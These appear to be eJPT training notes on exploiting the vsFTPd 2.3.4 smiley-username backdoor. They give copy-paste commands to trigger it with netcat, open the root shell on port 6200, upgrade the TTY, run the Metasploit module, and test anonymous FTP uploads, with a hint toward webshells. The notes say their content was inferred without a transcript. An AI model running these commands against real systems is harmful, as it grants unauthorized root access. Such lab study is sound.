# 06 - Targeting vsFTPd (eJPT Linux Exploitation)

Note: No transcript was provided; content inferred conservatively from the filename and typical eJPT workflow for exploiting the vsFTPd 2.3.4 backdoor (CVE-2011-2523) and basic FTP enumeration.

## What the video covers (Introduction / big picture)
- Identifying and targeting FTP services on Linux hosts.
- Recognizing vsFTPd 2.3.4 and safely confirming the infamous backdoor condition.
- Exploiting the backdoor to obtain a root shell (manual and with Metasploit).
- Basic FTP enumeration (anonymous access, write perms) if the backdoor is not present.
- Quick post-exploitation/TTY upgrade after gaining a shell.

## Flow (ordered)
1. Enumerate port 21 with Nmap; fingerprint the FTP service/version.
2. Run the NSE check for the vsFTPd 2.3.4 backdoor.
3. Manually verify/exploit by using a username ending with “:)”.
4. Connect to the spawned backdoor shell on TCP/6200 (if present).
5. Upgrade shell and perform quick system checks.
6. Alternatively, exploit with Metasploit’s vsftpd_234_backdoor module.
7. If not vulnerable: enumerate FTP for anonymous access and write permissions.

## Tools highlighted
- Nmap (service/version detection + NSE scripts)
- Netcat (banner grabbing, manual trigger, shell connection)
- ftp/telnet clients (manual interaction with FTP)
- Metasploit Framework (exploit/unix/ftp/vsftpd_234_backdoor)
- searchsploit (optional reference to known exploit)

## Typical command walkthrough (detailed, copy-paste friendly)
Replace 10.10.10.10 with your target IP.

1) Set target var
```
export IP=10.10.10.10
```

2) Enumerate FTP, detect version, run common scripts
```
nmap -Pn -p21 -sV -sC -T4 $IP
```

3) Check specifically for the vsFTPd 2.3.4 backdoor
```
nmap -p21 --script=ftp-vsftpd-backdoor $IP
```

4) Quick banner grab (optional)
```
nc -nv $IP 21
# If you see "220 (vsFTPd 2.3.4)" be cautious but confirm with the NSE script above.
# QUIT to exit:
# QUIT
```

5) Manual backdoor trigger attempt (smiley in username)
- Using ftp:
```
ftp $IP
# Name (prompt): test:)
# Password: anything
# You will likely get "530 Login incorrect." That’s OK—the trigger may still occur.
quit
```
- Or in one go with netcat:
```
printf "USER test:)\r\nPASS test\r\n" | nc -nv $IP 21
```

6) Connect to the backdoor shell on port 6200
```
nc -nv $IP 6200
# If successful, you should get a shell (often root).
id
uname -a
```

7) Upgrade shell (if needed)
- If Python present:
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
- If Python missing, try:
```
/usr/bin/script -q /dev/null -c /bin/bash
```

8) Metasploit alternative
```
msfconsole -q
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $IP
set RPORT 21
run
# When you get a shell:
sessions -i 1
id
uname -a
```

9) If not vulnerable: basic FTP enumeration
```
nmap -p21 --script=ftp-anon,ftp-syst $IP
ftp -inv $IP << 'EOF'
user anonymous anonymous@
ls -la
pwd
cd upload
put test.txt
ls -la
bye
EOF
```

## Practical tips
- vsFTPd 2.3.4 in a banner does not guarantee the backdoor; always validate with the NSE script or manual trigger.
- The backdoor typically opens a root shell on TCP port 6200 only after a “USER <anything>:)” attempt. Connect immediately to 6200 with nc.
- If 6200 doesn’t open, the target is either not the backdoored build or a firewall is blocking 6200.
- Use -Pn with Nmap if the host drops ping.
- Prefer manual trigger first; if it fails, try Metasploit to double-check.
- If there is no backdoor, pivot to classic FTP checks: anonymous access, directory listing, and upload (write) permissions. A writable FTP directory can lead to webshells if it maps to a web root.
- Keep post-exploitation minimal and in scope. The backdoor, if present, often yields root; verify with id and proceed carefully.

## Minimal cheat sheet (one-screen flow)
```
export IP=10.10.10.10

# 1) Enum
nmap -Pn -p21 -sV -sC $IP
nmap -p21 --script=ftp-vsftpd-backdoor $IP

# 2) Manual trigger
printf "USER x:)\r\nPASS y\r\n" | nc -nv $IP 21

# 3) Backdoor shell
nc -nv $IP 6200
id; uname -a
python -c 'import pty; pty.spawn("/bin/bash")' || /usr/bin/script -q /dev/null -c /bin/bash

# 4) Metasploit alt
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $IP; run"

# 5) If not vuln, check anonymous
nmap -p21 --script=ftp-anon,ftp-syst $IP
```

## Summary
- The module targets vsFTPd, focusing on detecting and exploiting the compromised vsFTPd 2.3.4 backdoor that spawns a root shell on TCP/6200 after a username ending in “:)”.
- Use Nmap to fingerprint FTP and run ftp-vsftpd-backdoor. Manually trigger with a smiley username and connect to 6200 via netcat. Alternatively, leverage Metasploit’s vsftpd_234_backdoor module.
- If the host is not backdoored, pivot to standard FTP enumeration (anonymous access, write permissions) for alternative footholds.